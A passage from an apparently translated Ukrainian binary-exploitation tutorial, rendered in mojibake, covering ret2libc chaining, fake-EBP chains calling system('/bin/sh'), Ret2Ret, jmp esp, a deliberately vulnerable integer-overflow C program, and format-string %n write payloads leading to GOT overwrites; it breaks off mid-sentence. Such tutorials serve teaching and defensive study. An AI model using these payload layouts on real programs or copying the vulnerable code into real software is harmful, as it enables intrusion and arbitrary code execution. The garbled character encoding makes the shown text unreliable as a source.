**–õ–∞–Ω—Ü—é–∂–æ–∫ —Ñ—É–Ω–∫—Ü—ñ–π**

–ù–∞ –æ—Å–Ω–æ–≤—ñ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ—ó —Ç–µ—Ö–Ω—ñ–∫–∏, —Ü–µ–π —Å–ø–æ—Å—ñ–± –µ–∫—Å–ø–ª–æ–π—Ç—É–≤–∞–Ω–Ω—è –ø–æ–ª—è–≥–∞—î –≤:\
–ó–∞–ø–æ–≤–Ω—é–≤–∞—á + \&–§—É–Ω–∫—Ü—ñ—è1 + \&pop;ret; + \&arg\_fun1 + \&–§—É–Ω–∫—Ü—ñ—è2 + \&pop;ret; + \&arg\_fun2 + ‚Ä¶

–¢–∞–∫–∏–º —á–∏–Ω–æ–º –º–æ–∂–Ω–∞ –ª–∞–Ω—Ü—é–≥–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—ó, —è–∫—ñ –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∏–∫–ª–∏–∫–∞—Ç–∏. –ö—Ä—ñ–º —Ç–æ–≥–æ, —è–∫—â–æ –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—ó –∑ –¥–µ–∫—ñ–ª—å–∫–æ–º–∞ –∞—Ä–≥—É–º–µ–Ω—Ç–∞–º–∏, –º–æ–∂–Ω–∞ –≤–∫–∞–∑–∞—Ç–∏ –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ –∞—Ä–≥—É–º–µ–Ω—Ç–∏ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, 4) —ñ –≤–∫–∞–∑–∞—Ç–∏ 4 –∞—Ä–≥—É–º–µ–Ω—Ç–∏ —Ç–∞ –∑–Ω–∞–π—Ç–∏ –∞–¥—Ä–µ—Å—É –º—ñ—Å—Ü—è –∑ –æ–ø–∫–æ–¥–∞–º–∏: pop, pop, pop, pop, ret ‚Äî> **objdump -d –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–π_—Ñ–∞–π–ª**

**–õ–∞–Ω—Ü—é–∂–æ–∫ —á–µ—Ä–µ–∑ —Ñ–∞–ª—å—Å–∏—Ñ—ñ–∫–∞—Ü—ñ—é —Ñ—Ä–µ–π–º—ñ–≤ (–ª–∞–Ω—Ü—é–∂–æ–∫ EBPs)**

–ü–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ–± –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –º–∞–Ω—ñ–ø—É–ª—é–≤–∞—Ç–∏ EBP –¥–ª—è –ø–æ—Å–ª—ñ–¥–æ–≤–Ω–æ–≥–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫—ñ–ª—å–∫–æ—Ö —Ñ—É–Ω–∫—Ü—ñ–π —á–µ—Ä–µ–∑ EBP —Ç–∞ "leave;ret"

RELLENO

* –í—Å—Ç–∞–Ω–æ–≤–ª—é—î–º–æ –≤ EBP —Ö–∏–±–Ω–∏–π EBP, —è–∫–∏–π –≤–∫–∞–∑—É—î –Ω–∞: 2-–π —Ö–∏–±–Ω–∏–π EBP + —Ñ—É–Ω–∫—Ü—ñ—è –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è: (\&system() + \&leave;ret + &‚Äú/bin/sh‚Äù)
* –í EIP –≤–∫–∞–∑—É—î–º–æ –∞–¥—Ä–µ—Å—É —Ñ—É–Ω–∫—Ü—ñ—ó &(leave;ret)

–ü–æ—á–∏–Ω–∞—î–º–æ shellcode –∑ –∞–¥—Ä–µ—Å–æ—é –Ω–∞ –Ω–∞—Å—Ç—É–ø–Ω—É —á–∞—Å—Ç–∏–Ω—É shellcode, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥: 2-–π —Ö–∏–±–Ω–∏–π EBP + \&system() + &(leave;ret;) + &‚Äù/bin/sh‚Äù

2-–π EBP –±—É–¥–µ: 3-–π —Ö–∏–±–Ω–∏–π EBP + \&system() + &(leave;ret;) + &‚Äù/bin/ls‚Äù

–¶—é shellcode –º–æ–∂–Ω–∞ –ø–æ–≤—Ç–æ—Ä—é–≤–∞—Ç–∏ –Ω–µ—Å–∫—ñ–Ω—á–µ–Ω–Ω–æ –≤ –¥–æ—Å—Ç—É–ø–Ω–∏—Ö —á–∞—Å—Ç–∏–Ω–∞—Ö –ø–∞–º'—è—Ç—ñ, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ shellcode, —è–∫—É –º–æ–∂–Ω–∞ –ª–µ–≥–∫–æ —Ä–æ–∑–¥—ñ–ª–∏—Ç–∏ –Ω–∞ –Ω–µ–≤–µ–ª–∏–∫—ñ —à–º–∞—Ç–∫–∏ –ø–∞–º'—è—Ç—ñ.

(–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –≤–∏–∫–ª–∏–∫—ñ–≤ —Ñ—É–Ω–∫—Ü—ñ–π, –∑–º—ñ—à—É—é—á–∏ –ø–æ–±–∞—á–µ–Ω—ñ —Ä–∞–Ω—ñ—à–µ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ EBP —Ç–∞ ret2lib)

## **5. –î–æ–¥–∞—Ç–∫–æ–≤—ñ –º–µ—Ç–æ–¥–∏**

**Ret2Ret**

–ö–æ—Ä–∏—Å–Ω–æ, –∫–æ–ª–∏ –Ω–µ –º–æ–∂–Ω–∞ –≤—Å—Ç–∞–≤–∏—Ç–∏ –∞–¥—Ä–µ—Å—É —Å—Ç–µ–∫—É –≤ EIP (–ø–µ—Ä–µ–≤—ñ—Ä—è—î—Ç—å—Å—è, —â–æ EIP –Ω–µ –º—ñ—Å—Ç–∏—Ç—å 0xbf) –∞–±–æ –∫–æ–ª–∏ –Ω–µ –º–æ–∂–Ω–∞ –æ–±—á–∏—Å–ª–∏—Ç–∏ —Ä–æ–∑—Ç–∞—à—É–≤–∞–Ω–Ω—è shellcode. –ü—Ä–æ—Ç–µ –≤—Ä–∞–∑–ª–∏–≤–∞ —Ñ—É–Ω–∫—Ü—ñ—è –ø—Ä–∏–π–º–∞—î –ø–∞—Ä–∞–º–µ—Ç—Ä (—Å—é–¥–∏ –±—É–¥–µ –≤—Å—Ç–∞–≤–ª–µ–Ω–∞ shellcode).

–¢–∞–∫–∏–º —á–∏–Ω–æ–º, –∑–º—ñ–Ω–∏–≤—à–∏ EIP –Ω–∞ –∞–¥—Ä–µ—Å—É **ret**, –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç—å—Å—è –Ω–∞—Å—Ç—É–ø–Ω–∞ –∞–¥—Ä–µ—Å–∞ (—è–∫–∞ —î –∞–¥—Ä–µ—Å–æ—é –ø–µ—Ä—à–æ–≥–æ –∞—Ä–≥—É–º–µ–Ω—Ç–∞ —Ñ—É–Ω–∫—Ü—ñ—ó). –Ü–Ω—à–∏–º–∏ —Å–ª–æ–≤–∞–º–∏, –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç—å—Å—è shellcode.

Exploit –≤–∏–≥–ª—è–¥–∞—Ç–∏–º–µ —Ç–∞–∫: SHELLCODE + –ó–∞–ø–æ–≤–Ω—é–≤–∞—á (–¥–æ EIP) + **\&ret** (–Ω–∞—Å—Ç—É–ø–Ω—ñ –±–∞–π—Ç–∏ —Å—Ç–µ–∫—É –≤–∫–∞–∑—É—é—Ç—å –Ω–∞ –ø–æ—á–∞—Ç–æ–∫ shellcode, –æ—Å–∫—ñ–ª—å–∫–∏ –≤ —Å—Ç–µ–∫ –≤—Å—Ç–∞–≤–ª—è—î—Ç—å—Å—è –∞–¥—Ä–µ—Å–∞ –ø–µ—Ä–µ–¥–∞–Ω–æ–≥–æ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞)

–ó–¥–∞—î—Ç—å—Å—è, —â–æ —Ñ—É–Ω–∫—Ü—ñ—ó, —Ç–∞–∫—ñ —è–∫ **strncpy**, –ø—ñ—Å–ª—è –∑–∞–≤–µ—Ä—à–µ–Ω–Ω—è –≤–∏–¥–∞–ª—è—é—Ç—å –∑—ñ —Å—Ç–µ–∫—É –∞–¥—Ä–µ—Å—É, –¥–µ –±—É–ª–∞ –∑–±–µ—Ä–µ–∂–µ–Ω–∞ shellcode, —É—Å–∫–ª–∞–¥–Ω—é—é—á–∏ —Ü—é —Ç–µ—Ö–Ω—ñ–∫—É. –Ü–Ω—à–∏–º–∏ —Å–ª–æ–≤–∞–º–∏, –∞–¥—Ä–µ—Å–∞, —è–∫—É –ø–µ—Ä–µ–¥–∞—é—Ç—å —Ñ—É–Ω–∫—Ü—ñ—ó —è–∫ –∞—Ä–≥—É–º–µ–Ω—Ç (—è–∫–∞ –∑–±–µ—Ä—ñ–≥–∞—î shellcode), –∑–º—ñ–Ω—é—î—Ç—å—Å—è –Ω–∞ 0x00, —Ç–æ–º—É –∫–æ–ª–∏ –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è –¥—Ä—É–≥–∏–π **ret**, –≤—ñ–Ω –∑—É—Å—Ç—Ä—ñ—á–∞—î 0x00 —ñ –ø—Ä–æ–≥—Ä–∞–º–∞ –ø—Ä–∏–ø–∏–Ω—è—î —Ä–æ–±–æ—Ç—É.
```
**Ret2PopRet**
```
–Ø–∫—â–æ —É –Ω–∞—Å –Ω–µ–º–∞—î –∫–æ–Ω—Ç—Ä–æ–ª—é –Ω–∞–¥ –ø–µ—Ä—à–∏–º –∞—Ä–≥—É–º–µ–Ω—Ç–æ–º, –∞–ª–µ —î –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ –¥—Ä—É–≥–∏–º –∞–±–æ —Ç—Ä–µ—Ç—ñ–º, –º–∏ –º–æ–∂–µ–º–æ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ EIP –∞–¥—Ä–µ—Å–æ—é pop-ret –∞–±–æ pop-pop-ret, –≤ –∑–∞–ª–µ–∂–Ω–æ—Å—Ç—ñ –≤—ñ–¥ –ø–æ—Ç—Ä–µ–±–∏.

**–¢–µ—Ö–Ω—ñ–∫–∞ –ú—É—Ä–∞—Ç–∞**

–£ Linux –≤—Å—ñ –ø—Ä–æ–≥—Ä–∞–º–∏ –ø–æ—á–∏–Ω–∞—é—Ç—å—Å—è –∑ –∞–¥—Ä–µ—Å–∏ 0xbfffffff.

–†–æ–∑–≥–ª—è–¥–∞—é—á–∏, —è–∫ —Ñ–æ—Ä–º—É—î—Ç—å—Å—è —Å—Ç–µ–∫ –Ω–æ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É –≤ Linux, –º–æ–∂–Ω–∞ —Ä–æ–∑—Ä–æ–±–∏—Ç–∏ –µ–∫—Å–ø–ª–æ—ñ—Ç —Ç–∞–∫, —â–æ–± –ø—Ä–æ–≥—Ä–∞–º–∞ –∑–∞–ø—É—Å–∫–∞–ª–∞—Å—è –≤ —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ, –¥–µ —î –ª–∏—à–µ –∑–º—ñ–Ω–Ω–∞ –∑ –∫–æ–¥–æ–º –æ–±–æ–ª–æ–Ω–∫–∏. –ê–¥—Ä–µ—Å—É —Ü—ñ—î—ó –∑–º—ñ–Ω–Ω–æ—ó –º–æ–∂–Ω–∞ –æ–±—á–∏—Å–ª–∏—Ç–∏ —è–∫: addr = 0xbfffffff - 4 - strlen(NOMBRE\_ejecutable\_completo) - strlen(shellcode)

–¢–∞–∫–∏–º —á–∏–Ω–æ–º, –º–æ–∂–Ω–∞ –ª–µ–≥–∫–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ –∞–¥—Ä–µ—Å—É –∑–º—ñ–Ω–Ω–æ—ó —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ –∑ –∫–æ–¥–æ–º –æ–±–æ–ª–æ–Ω–∫–∏.

–¶–µ –º–æ–∂–ª–∏–≤–æ –∑–∞–≤–¥—è–∫–∏ —Ç–æ–º—É, —â–æ —Ñ—É–Ω–∫—Ü—ñ—è execle –¥–æ–∑–≤–æ–ª—è—î —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ —Å–µ—Ä–µ–¥–æ–≤–∏—â–µ –ª–∏—à–µ –∑ –±–∞–∂–∞–Ω–∏–º–∏ –∑–º—ñ–Ω–Ω–∏–º–∏ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞.

**–ü–µ—Ä–µ—Ö—ñ–¥ –¥–æ ESP: –°—Ç–∏–ª—å Windows**

–û—Å–∫—ñ–ª—å–∫–∏ ESP –∑–∞–≤–∂–¥–∏ –≤–∫–∞–∑—É—î –Ω–∞ –ø–æ—á–∞—Ç–æ–∫ —Å—Ç–µ–∫—É, —Ü—è —Ç–µ—Ö–Ω—ñ–∫–∞ –ø–æ–ª—è–≥–∞—î –≤ –∑–∞–º—ñ–Ω—ñ EIP –∞–¥—Ä–µ—Å–æ—é –≤–∏–∫–ª–∏–∫—É **jmp esp** –∞–±–æ **call esp**. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, –ø—ñ—Å–ª—è –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É EIP –∫–æ–¥ –æ–±–æ–ª–æ–Ω–∫–∏ –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è, –æ—Å–∫—ñ–ª—å–∫–∏ –ø—ñ—Å–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è **ret** ESP –±—É–¥–µ –≤–∫–∞–∑—É–≤–∞—Ç–∏ –Ω–∞ –Ω–∞—Å—Ç—É–ø–Ω—É –∞–¥—Ä–µ—Å—É, –¥–µ –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è –∫–æ–¥ –æ–±–æ–ª–æ–Ω–∫–∏.

–£ –≤–∏–ø–∞–¥–∫—É, —è–∫—â–æ ASLR –Ω–µ –∞–∫—Ç–∏–≤–æ–≤–∞–Ω–æ –≤ Windows –∞–±–æ Linux, –º–æ–∂–Ω–∞ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ **jmp esp** –∞–±–æ **call esp**, –∑–±–µ—Ä–µ–∂–µ–Ω—ñ –≤ —è–∫–æ–º—É—Å—å —Å–ø—ñ–ª—å–Ω–æ–º—É –æ–±'—î–∫—Ç—ñ. –Ø–∫—â–æ ASLR –∞–∫—Ç–∏–≤–æ–≤–∞–Ω–æ, –º–æ–∂–Ω–∞ —à—É–∫–∞—Ç–∏ –≤ –º–µ–∂–∞—Ö —Å–∞–º–æ—ó –≤—Ä–∞–∑–ª–∏–≤–æ—ó –ø—Ä–æ–≥—Ä–∞–º–∏.

–ö—Ä—ñ–º —Ç–æ–≥–æ, –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å —Ä–æ–∑–º—ñ—â–µ–Ω–Ω—è –∫–æ–¥—É –æ–±–æ–ª–æ–Ω–∫–∏ –ø—ñ—Å–ª—è –ø–æ—Ä—É—à–µ–Ω–Ω—è EIP –∑–∞–º—ñ—Å—Ç—å –≤ —Å–µ—Ä–µ–¥–∏–Ω—ñ —Å—Ç–µ–∫—É –¥–æ–∑–≤–æ–ª—è—î —É–Ω–∏–∫–Ω—É—Ç–∏ —Ç–æ–≥–æ, —â–æ —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—ó push –∞–±–æ pop, —è–∫—ñ –≤–∏–∫–æ–Ω—É—é—Ç—å—Å—è –≤ —Å–µ—Ä–µ–¥–∏–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó, –¥–æ—Ç–æ—Ä–∫–Ω—É—Ç—å—Å—è –∫–æ–¥—É –æ–±–æ–ª–æ–Ω–∫–∏ (—â–æ –º–æ–∂–µ —Å—Ç–∞—Ç–∏—Å—è, —è–∫—â–æ –≤–æ–Ω–∞ —Ä–æ–∑–º—ñ—â—É—î—Ç—å—Å—è –≤ —Å–µ—Ä–µ–¥–∏–Ω—ñ —Å—Ç–µ–∫—É —Ñ—É–Ω–∫—Ü—ñ—ó).

–î—É–∂–µ —Å—Ö–æ–∂–µ –Ω–∞ —Ü–µ, —è–∫—â–æ –º–∏ –∑–Ω–∞—î–º–æ, —â–æ —Ñ—É–Ω–∫—Ü—ñ—è –ø–æ–≤–µ—Ä—Ç–∞—î –∞–¥—Ä–µ—Å—É, –¥–µ –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è –∫–æ–¥ –æ–±–æ–ª–æ–Ω–∫–∏, –º–æ–∂–Ω–∞ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ **call eax** –∞–±–æ **jmp eax (ret2eax).**

**–ü–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è —Ü—ñ–ª–∏—Ö —á–∏—Å–µ–ª**

–¶–µ–π —Ç–∏–ø –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω—å –≤–∏–Ω–∏–∫–∞—î, –∫–æ–ª–∏ –∑–º—ñ–Ω–Ω–∞ –Ω–µ –≥–æ—Ç–æ–≤–∞ –æ–±—Ä–æ–±–ª—è—Ç–∏ —Ç–∞–∫–µ –≤–µ–ª–∏–∫–µ —á–∏—Å–ª–æ, —è–∫–æ–º—É —ó—ó –ø–µ—Ä–µ–¥–∞—é—Ç—å, –º–æ–∂–ª–∏–≤–æ —á–µ—Ä–µ–∑ –ø–ª—É—Ç–∞–Ω–∏–Ω—É –º—ñ–∂ –∑–º—ñ–Ω–Ω–∏–º–∏ –∑—ñ –∑–Ω–∞–∫–æ–º —ñ –±–µ–∑, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
–£ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ –º–∏ –±–∞—á–∏–º–æ, —â–æ –ø—Ä–æ–≥—Ä–∞–º–∞ –æ—á—ñ–∫—É—î 2 –ø–∞—Ä–∞–º–µ—Ç—Ä–∏. –ü–µ—Ä—à–∏–π - –¥–æ–≤–∂–∏–Ω–∞ –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ —Ä—è–¥–∫–∞, –∞ –¥—Ä—É–≥–∏–π - —Å–∞–º —Ä—è–¥–æ–∫.

–Ø–∫—â–æ –º–∏ –ø–µ—Ä–µ–¥–∞–º–æ –≤ —è–∫–æ—Å—Ç—ñ –ø–µ—Ä—à–æ–≥–æ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ –≤—ñ–¥'—î–º–Ω–µ —á–∏—Å–ª–æ, –≤–∏–π–¥–µ, —â–æ len < 256, —ñ –º–∏ –ø—Ä–æ–π–¥–µ–º–æ —Ü–µ–π —Ñ—ñ–ª—å—Ç—Ä, –∞ —Ç–∞–∫–æ–∂ strlen(buffer) –±—É–¥–µ –º–µ–Ω—à–µ, –Ω—ñ–∂ l, –æ—Å–∫—ñ–ª—å–∫–∏ l —î –±–µ–∑–∑–Ω–∞–∫–æ–≤–∏–º int —ñ –±—É–¥–µ –¥—É–∂–µ –≤–µ–ª–∏–∫–∏–º.

–¶–µ–π —Ç–∏–ø –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω—å –Ω–µ —Å–ø—Ä—è–º–æ–≤–∞–Ω–∏–π –Ω–∞ –∑–∞–ø–∏—Å —á–æ–≥–æ—Å—å —É –ø—Ä–æ—Ü–µ—Å –ø—Ä–æ–≥—Ä–∞–º–∏, –∞ –Ω–∞ –æ–±—Ö—ñ–¥ –ø–æ–≥–∞–Ω–æ —Ä–æ–∑—Ä–æ–±–ª–µ–Ω–∏—Ö —Ñ—ñ–ª—å—Ç—Ä—ñ–≤ –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —ñ–Ω—à–∏—Ö –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π.

**–ù–µ–≤–∏–∑–Ω–∞—á–µ–Ω—ñ –∑–º—ñ–Ω–Ω—ñ**

–ù–µ –≤—ñ–¥–æ–º–æ, —è–∫–µ –∑–Ω–∞—á–µ–Ω–Ω—è –º–æ–∂–µ –ø—Ä–∏–π–Ω—è—Ç–∏ –Ω–µ–≤–∏–∑–Ω–∞—á–µ–Ω–∞ –∑–º—ñ–Ω–Ω–∞, —ñ —Ü–µ –º–æ–∂–µ –±—É—Ç–∏ —Ü—ñ–∫–∞–≤–æ –≤–∏–≤—á–∏—Ç–∏. –ú–æ–∂–ª–∏–≤–æ, –≤–æ–Ω–∞ –ø—Ä–∏–π–º–µ –∑–Ω–∞—á–µ–Ω–Ω—è –∑–º—ñ–Ω–Ω–æ—ó –∑ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ—ó —Ñ—É–Ω–∫—Ü—ñ—ó, —è–∫–∞ –º–æ–∂–µ –±—É—Ç–∏ –∫–µ—Ä–æ–≤–∞–Ω–∞ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–æ–º.

## **–†—è–¥–∫–∏ —Ñ–æ—Ä–º–∞—Ç—É–≤–∞–Ω–Ω—è**

–£ –º–æ–≤—ñ C **`printf`** - —Ü–µ —Ñ—É–Ω–∫—Ü—ñ—è, —è–∫—É –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è **–≤–∏–≤–µ–¥–µ–Ω–Ω—è** –¥–µ—è–∫–æ–≥–æ —Ä—è–¥–∫–∞. **–ü–µ—Ä—à–∏–π –ø–∞—Ä–∞–º–µ—Ç—Ä**, —è–∫–∏–π –æ—á—ñ–∫—É—î —Ü—è —Ñ—É–Ω–∫—Ü—ñ—è, - —Ü–µ **—Å–∏—Ä—ñ–π —Ç–µ–∫—Å—Ç –∑ —Ñ–æ—Ä–º–∞—Ç–µ—Ä–∞–º–∏**. **–ù–∞—Å—Ç—É–ø–Ω—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏** - —Ü–µ **–∑–Ω–∞—á–µ–Ω–Ω—è**, —è–∫—ñ **–∑–∞–º—ñ–Ω—è—Ç—å** **—Ñ–æ—Ä–º–∞—Ç–µ—Ä–∏** —É —Å–∏—Ä–æ–º—É —Ç–µ–∫—Å—Ç—ñ.

–í—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –≤–∏–Ω–∏–∫–∞—î, –∫–æ–ª–∏ **—Ç–µ–∫—Å—Ç –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —è–∫ –ø–µ—Ä—à–∏–π –∞—Ä–≥—É–º–µ–Ω—Ç** —Ü—ñ–π —Ñ—É–Ω–∫—Ü—ñ—ó. –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑–º–æ–∂–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ **—Å–ø–µ—Ü—ñ–∞–ª—å–Ω–∏–π –≤–≤—ñ–¥, –∑–ª–æ–≤–∂–∏–≤–∞—é—á–∏** –º–æ–∂–ª–∏–≤–æ—Å—Ç—è–º–∏ **—Ä—è–¥–∫–∞ —Ñ–æ—Ä–º–∞—Ç—É–≤–∞–Ω–Ω—è printf** –¥–ª—è **–∑–∞–ø–∏—Å—É –±—É–¥—å-—è–∫–∏—Ö –¥–∞–Ω–∏—Ö –∑–∞ –±—É–¥—å-—è–∫–æ—é –∞–¥—Ä–µ—Å–æ—é**. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, –≤—ñ–Ω –º–æ–∂–µ **–≤–∏–∫–æ–Ω–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π –∫–æ–¥**.

–§–æ—Ä–º–∞—Ç–µ—Ä–∏:
```bash
%08x ‚Äî> 8 hex bytes
%d ‚Äî> Entire
%u ‚Äî> Unsigned
%s ‚Äî> String
%n ‚Äî> Number of written bytes
%hn ‚Äî> Occupies 2 bytes instead of 4
<n>$X ‚Äî> Direct access, Example: ("%3$d", var1, var2, var3) ‚Äî> Access to var3
```
**`%n`** **–∑–∞–ø–∏—Å—É—î** –∫—ñ–ª—å–∫—ñ—Å—Ç—å **–∑–∞–ø–∏—Å–∞–Ω–∏—Ö –±–∞–π—Ç—ñ–≤** –∑–∞ **–≤–∫–∞–∑–∞–Ω–æ—é –∞–¥—Ä–µ—Å–æ—é. –ó–∞–ø–∏—Å—É—é—á–∏** —Å—Ç—ñ–ª—å–∫–∏ **–±–∞–π—Ç—ñ–≤**, —Å–∫—ñ–ª—å–∫–∏ **–Ω–µ–æ–±—Ö—ñ–¥–Ω–æ** –≤ —à—ñ—Å—Ç–Ω–∞–¥—Ü—è—Ç–∫–æ–≤–æ–º—É —Ñ–æ—Ä–º–∞—Ç—ñ, –º–æ–∂–Ω–∞ **–∑–∞–ø–∏—Å–∞—Ç–∏ –±—É–¥—å-—è–∫—ñ –¥–∞–Ω—ñ**.
```bash
AAAA%.6000d%4\$n ‚Äî> Write 6004 in the address indicated by the 4¬∫ param
AAAA.%500\$08x ‚Äî> Param at offset 500
```
### GOT (Global Offsets Table) / PLT (Procedure Linkage Table)

–¶–µ —Ç–∞–±–ª–∏—Ü—è, —è–∫–∞ –º—ñ—Å—Ç–∏—Ç—å **–∞–¥—Ä–µ—Å—É** –¥–æ **–∑–æ–≤–Ω—ñ—à–Ω—ñ—Ö —Ñ—É–Ω–∫—Ü—ñ–π**, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –ø—Ä–æ–≥—Ä–∞–º–∞.

–û—Ç—Ä–∏–º–∞–π—Ç–µ –∞–¥—Ä–µ—Å—É —Ü—ñ—î—ó —Ç–∞–±–ª–∏—Ü—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é: **`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

–°–ø–æ—Å—Ç–µ—Ä—ñ–≥–∞–π—Ç–µ, —è–∫ –ø—ñ—Å–ª—è **–∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è** –≤–∏–∫–æ–Ω—É–≤–∞–Ω–æ–≥–æ —Ñ–∞–π–ª—É –≤ GEF –≤–∏ –º–æ–∂–µ—Ç–µ **–ø–æ–±–∞—á–∏—Ç–∏** **—Ñ—É–Ω–∫—Ü—ñ—ó**, —è–∫—ñ –∑–Ω–∞—Ö–æ–¥—è—Ç—å—Å—è –≤ **GOT**: `gef‚û§ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

–ó–∞ –¥–æ–ø–æ–º–æ–≥–æ—é GEF –≤–∏ –º–æ–∂–µ—Ç–µ **—Ä–æ–∑–ø–æ—á–∞—Ç–∏** **—Å–µ–∞–Ω—Å –Ω–∞–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—è** —Ç–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏ **`got`**, —â–æ–± –ø–æ–±–∞—á–∏—Ç–∏ —Ç–∞–±–ª–∏—Ü—é got:

![](<../../.gitbook/assets/image (621).png>)

–£ –±—ñ–Ω–∞—Ä–Ω–æ–º—É —Ñ–∞–π–ª—ñ GOT –º—ñ—Å—Ç–∏—Ç—å **–∞–¥—Ä–µ—Å–∏ —Ñ—É–Ω–∫—Ü—ñ–π –∞–±–æ** —Å–µ–∫—Ü—ñ—é **PLT**, —è–∫–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç—å –∞–¥—Ä–µ—Å—É —Ñ—É–Ω–∫—Ü—ñ—ó. –ú–µ—Ç–æ—é —Ü—å–æ–≥–æ –µ–∫—Å–ø–ª–æ–π—Ç—É —î **–ø–µ—Ä–µ–∑–∞–ø–∏—Å GOT-–∑–∞–ø–∏—Å—É** —Ñ—É–Ω–∫—Ü—ñ—ó, —è–∫–∞ –±—É–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–∞ –ø—ñ–∑–Ω—ñ—à–µ **–∑** –∞–¥—Ä–µ—Å–æ—é PLT —Ñ—É–Ω–∫—Ü—ñ—ó **`system`**. –Ü–¥–µ–∞–ª—å–Ω–æ, –≤–∏ **–ø–µ—Ä–µ–∑–∞–ø–∏—à–µ—Ç–µ** GOT **—Ñ—É–Ω–∫—Ü—ñ—ó**, —è–∫–∞ **–±—É–¥–µ –≤–∏–∫–ª–∏–∫–∞–Ω–∞ –∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏, —è–∫—ñ –∫–æ–Ω—Ç—Ä–æ–ª—é—é—Ç—å—Å—è –≤–∞–º–∏** (—Ç–∞–∫–∏–º —á–∏–Ω–æ–º, –≤–∏ –∑–º–æ–∂–µ—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏, —è–∫—ñ –Ω–∞–¥—Å–∏–ª–∞—é—Ç—å—Å—è —Ñ—É–Ω–∫—Ü—ñ—ó 